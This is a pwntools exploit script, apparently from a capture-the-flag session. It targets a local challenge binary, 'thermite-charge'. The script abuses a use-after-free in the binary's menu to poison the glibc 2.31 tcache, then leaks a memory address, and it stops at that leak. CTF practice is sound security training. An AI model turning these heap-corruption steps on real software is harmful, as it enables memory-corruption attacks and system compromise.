from pwn import *
import sys
sys.stdout = open('/tmp/p5.txt','w',buffering=1); sys.stderr = sys.stdout
context.log_level='error'
def start():
    return process(['/home/ctfplayer/workspace/loc/ld-2.31.so','--library-path','/home/ctfplayer/workspace/loc','/home/ctfplayer/workspace/loc/thermite-charge'])
io = start()
def plant(slot, size, data):
    io.send(b'1\n'); io.recvuntil(b'slot (0-15): ')
    io.send(str(slot).encode()+b'\n'); io.recvuntil(b'size: ')
    io.send(str(size).encode()+b'\n'); io.recvuntil(b'payload: ')
    io.send(data.ljust(size, b'\x00')); io.recvuntil(b'slot %d\n' % slot)
    print('plant ok', slot)
def defuse(slot):
    io.send(b'2\n'); io.recvuntil(b'slot: ')
    io.send(str(slot).encode()+b'\n'); io.recvuntil(b'defused\n')
    print('defuse ok', slot)
def rewire(slot, data, sz):
    io.send(b'3\n'); io.recvuntil(b'slot: ')
    io.send(str(slot).encode()+b'\n'); io.recvuntil(b'payload: ')
    io.send(data.ljust(sz, b'\x00')); io.recvuntil(b'rewired\n')
    print('rewire ok', slot)
def inspect(slot, n):
    io.send(b'4\n'); io.recvuntil(b'slot: ')
    io.send(str(slot).encode()+b'\n'); io.recvuntil(b'bytes: ')
    io.send(str(n).encode()+b'\n')
    r = io.recvn(n); print('inspect ok', slot, r.hex()); return r

plant(0, 0x100, b'a'*8)
plant(1, 0x100, b'b'*8)
defuse(0)
rewire(0, p64(0), 0x100)
plant(2, 0x100, b'c'*8)
defuse(2)
rewire(0, p64(0x1eee48-0x10), 0x100)
plant(3, 0x100, b'd'*8)
plant(4, 0x100, b'e'*8)
leak = u64(inspect(4, 8))
print('LEAK', hex(leak))
EOF
